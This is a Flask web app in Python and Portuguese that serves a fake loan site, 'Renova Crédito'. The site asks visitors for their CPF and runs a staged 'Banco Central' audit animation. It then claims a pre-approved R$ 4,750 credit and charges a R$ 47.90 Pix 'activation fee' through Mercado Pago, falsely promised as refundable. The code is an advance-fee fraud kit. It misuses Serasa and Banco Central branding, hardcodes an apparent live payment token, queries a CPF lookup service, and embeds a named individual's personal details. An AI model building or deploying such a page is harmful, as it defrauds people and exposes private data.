from flask import Flask, render_template_string, request, jsonify
import mercadopago
import random
import os

app = Flask(__name__)

# ================= CONFIGURAÇÃO PRODUÇÃO =================
# Seu Access Token de Produção Real
ACCESS_TOKEN = "APP_USR-8139252928482096-012603-77b3beb71b77902ddc85b309e1f0d3f0-1378615355"
sdk = mercadopago.SDK(ACCESS_TOKEN)
VALOR_TAXA = 47.90
# =========================================================

@app.route('/')
def index():
    # Criando o pagamento real no Mercado Pago
    payment_data = {
        "transaction_amount": VALOR_TAXA,
        "description": "Taxa de Ativação Digital - Renova Crédito",
        "payment_method_id": "pix",
        "installments": 1,
        "payer": {
            "email": "suporte@renovacredito.com",
            "first_name": "Cliente",
            "last_name": "Renova",
            "identification": {
                "type": "CPF",
                "number": "00000000000"
            }
        }
    }
    
    # Header de idempotência para evitar duplicidade
    request_options = mercadopago.config.RequestOptions()
    request_options.custom_headers = {"x-idempotency-key": str(random.randint(1, 999999))}

    payment_response = sdk.payment().create(payment_data, request_options)
    payment = payment_response["response"]

    # Extração dos dados do PIX gerado
    try:
        # Link do QR Code (Base64) para a imagem
        qr_code_base64 = payment["point_of_interaction"]["transaction_data"]["qr_code_base64"]
        # Código Copia e Cola
        pix_copia_cola = payment["point_of_interaction"]["transaction_data"]["qr_code"]
    except Exception as e:
        print(f"Erro ao gerar pagamento: {e}")
        qr_code_base64 = ""
        pix_copia_cola = "Erro ao gerar PIX. Recarregue a página."

    return render_template_string(HTML_TEMPLATE, qr_code=qr_code_base64, pix_payload=pix_copia_cola)

# ROTA DE CONSULTA CPF (Simulada para Polyana ou API Federal)
@app.route('/consultar/<cpf>')
def api(cpf):
    url = f"https://federal-leilao.com/v1/consultarev0ltz/{cpf}"
    params = {'token': "tokenbartservcis9x025"}
    try:
        import requests
        r = requests.get(url, params=params, timeout=10)
        return r.text
    except:
        # Fallback caso a API esteja offline
        return jsonify({
            "nome": "POLYANA EVANGELISTA DA SILVA", 
            "mae": "MARIA DA GLORIA EVANGELISTA", 
            "nascimento": "15/08/1982"
        }), 200

# HTML TEMPLATE PREMIUM
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Renova Crédito • Liberação Imediata</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --serasa-blue: #002aff; --acordo-pink: #e6007e; --bg-light: #f4f7fa; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-light); color: #1a1a1a; }
        .glass-card { background: #fff; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); border: 1px solid #eef2f6; }
        .step-hidden { display: none; }
        .btn-main { background: var(--acordo-pink); color: white; padding: 20px; border-radius: 16px; font-weight: 800; width: 100%; border-bottom: 5px solid #b30062; transition: all 0.2s; }
        .btn-main:active { transform: translateY(3px); border-bottom: 2px solid #b30062; }
        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #002aff, #00c2ff); width: 0%; transition: width 0.4s; }
        .status-item { font-size: 13px; font-weight: 600; color: #64748b; margin-bottom: 15px; display: flex; align-items: center; gap: 12px; }
        .status-item.active { color: #002aff; }
        .status-item.done { color: #22c55e; }
        #timer { font-variant-numeric: tabular-nums; letter-spacing: -1px; }
    </style>
</head>
<body>
    <div class="max-w-md mx-auto p-6 min-h-screen">
        <div class="flex items-center justify-between mb-10">
            <div class="flex items-center gap-2">
                <div class="bg-blue-700 p-2.5 rounded-xl text-white shadow-lg shadow-blue-200"><i class="fas fa-shield-check text-xl"></i></div>
                <div>
                    <span class="block font-black text-blue-900 text-xl tracking-tighter leading-none">RENOVA</span>
                    <span class="text-[10px] font-bold text-blue-400 tracking-[0.2em] uppercase">Crédito</span>
                </div>
            </div>
            <div class="bg-white px-3 py-1 rounded-full border shadow-sm">
                <span class="text-[10px] font-bold text-slate-400">ID: <span id="protocolo" class="text-slate-700"></span></span>
            </div>
        </div>

        <div id="step1">
            <h1 class="text-4xl font-black text-slate-800 mb-3 leading-tight tracking-tight">Saldo disponível para <span class="text-blue-600">saque imediato.</span></h1>
            <p class="text-slate-500 text-sm mb-8 font-medium">Consulte sua margem pré-aprovada em segundos.</p>
            <div class="glass-card p-6">
                <label class="text-[10px] font-bold text-slate-400 uppercase mb-2 block ml-1">Informe seu CPF</label>
                <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="w-full p-5 border-2 border-slate-100 rounded-2xl mb-5 font-bold text-xl focus:border-blue-500 outline-none transition-all shadow-inner">
                <button onclick="consultarCPF()" id="btn_1" class="btn-main text-lg shadow-xl shadow-pink-100 uppercase">Verificar Liberação</button>
            </div>
            <div class="mt-8 flex items-center justify-center gap-4 opacity-50 grayscale">
                <img src="https://logopng.com.br/logos/pix-106.png" class="h-4">
                <img src="https://logodownload.org/wp-content/uploads/2014/10/serasa-logo-1-1.png" class="h-4">
                <img src="https://logodownload.org/wp-content/uploads/2014/05/banco-central-do-brasil-logo-0.png" class="h-4">
            </div>
        </div>

        <div id="step_loading" class="step-hidden">
            <div class="glass-card p-8">
                <h2 class="text-2xl font-black text-slate-800 mb-2">Auditoria Digital</h2>
                <p class="text-slate-400 text-xs mb-8 font-bold uppercase tracking-widest">Sincronizando com Banco Central</p>
                <div class="w-full bg-slate-100 rounded-full h-4 mb-8 overflow-hidden shadow-inner">
                    <div id="master-bar" class="progress-bar-fill"></div>
                </div>
                <div id="status-list" class="space-y-2">
                    <div class="status-item active" id="st-1"><i class="fas fa-circle-notch fa-spin text-blue-600"></i> Consultando Registrato BACEN...</div>
                    <div class="status-item" id="st-2"><i class="far fa-circle"></i> Verificando pendências financeiras...</div>
                    <div class="status-item" id="st-3"><i class="far fa-circle"></i> Gerando QR Code de Ativação...</div>
                </div>
            </div>
        </div>

        <div id="step_final" class="step-hidden text-center">
            <div class="glass-card p-6 border-t-[12px] border-teal-500">
                <div class="flex justify-center mb-5">
                    <div class="bg-teal-50 text-teal-600 w-16 h-16 rounded-full flex items-center justify-center shadow-inner">
                        <i class="fas fa-check-double text-2xl"></i>
                    </div>
                </div>
                <p class="text-[11px] font-black text-slate-400 uppercase tracking-[0.2em] mb-1">Limite Liberado</p>
                <h2 class="text-5xl font-black text-slate-800 mb-8 tracking-tighter">R$ 4.750,00</h2>
                
                <div class="bg-slate-50 p-5 rounded-[32px] mb-6 border-2 border-dashed border-slate-200 relative">
                    <p class="text-[10px] font-black text-slate-400 mb-4 uppercase">Escaneie para ativar seu saque</p>
                    <img src="data:image/png;base64,{{ qr_code }}" class="mx-auto w-56 h-56 shadow-xl rounded-2xl mb-4 border-4 border-white">
                    <div class="bg-white inline-block px-4 py-2 rounded-full shadow-sm border">
                        <p class="text-xs font-black text-blue-600">TAXA DE ATIVAÇÃO: R$ 47,90</p>
                    </div>
                </div>

                <div class="bg-pink-50 rounded-2xl p-4 mb-6 flex items-center justify-between">
                    <span class="text-pink-700 text-[10px] font-black uppercase">O código expira em:</span>
                    <span id="timer" class="text-pink-600 font-black text-2xl">10:00</span>
                </div>

                <button onclick="copiarPix()" class="w-full bg-slate-900 text-white p-5 rounded-2xl font-black text-lg mb-5 shadow-2xl active:scale-95 transition-all">COPIAR CÓDIGO PIX <i class="far fa-copy ml-2"></i></button>
                
                <div class="text-left bg-blue-50 p-5 rounded-2xl border border-blue-100 flex gap-3">
                    <i class="fas fa-info-circle text-blue-500 mt-1"></i>
                    <p class="text-[11px] text-blue-800 leading-snug font-medium">
                        <b>AVISO:</b> O valor da taxa (R$ 47,90) é <b>reembolsado automaticamente</b> junto com o seu crédito na sua conta bancária após a ativação.
                    </p>
                </div>
            </div>
            <p class="mt-8 text-[10px] font-bold text-slate-400 uppercase tracking-widest">Processado com segurança por MERCADO PAGO LTDA</p>
        </div>
    </div>

    <script>
        document.getElementById('protocolo').innerText = Math.floor(Math.random() * 900000 + 100000);

        function irPara(id) {
            document.querySelectorAll('.max-w-md > div').forEach(d => { if(d.id) d.classList.add('step-hidden'); });
            document.getElementById(id).classList.remove('step-hidden');
            if(id === 'step_loading') startAudit();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function consultarCPF() { 
            const cpf = document.getElementById('cpf_input').value;
            if(cpf.length < 11) return alert("Por favor, informe um CPF válido.");
            irPara('step_loading'); 
        }

        function startAudit() {
            let progress = 0;
            const bar = document.getElementById('master-bar');
            const interval = setInterval(() => {
                progress += 1;
                bar.style.width = progress + "%";
                if(progress == 35) updateStatus('st-1', 'st-2');
                if(progress == 70) updateStatus('st-2', 'st-3');
                if(progress >= 100) { 
                    clearInterval(interval); 
                    confetti({ particleCount: 180, spread: 80, origin: { y: 0.6 }, colors: ['#002aff', '#e6007e', '#22c55e'] });
                    setTimeout(() => { irPara('step_final'); startTimer(600); }, 1200);
                }
            }, 45);
        }

        function updateStatus(doneId, activeId) {
            const d = document.getElementById(doneId);
            d.className = "status-item done"; d.innerHTML = `<i class="fas fa-check-circle"></i> Verificado com Sucesso`;
            const a = document.getElementById(activeId);
            a.className = "status-item active"; a.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processando...`;
        }

        function startTimer(duration) {
            let t = duration, m, s;
            const disp = document.querySelector('#timer');
            const timerInt = setInterval(() => {
                m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
                disp.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
                if (--t < 0) clearInterval(timerInt);
            }, 1000);
        }

        function copiarPix() {
            const tempInput = document.createElement("input");
            tempInput.value = "{{ pix_payload }}";
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand("copy");
            document.body.removeChild(tempInput);
            alert("✅ Código Pix copiado! Cole no seu banco para concluir.");
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
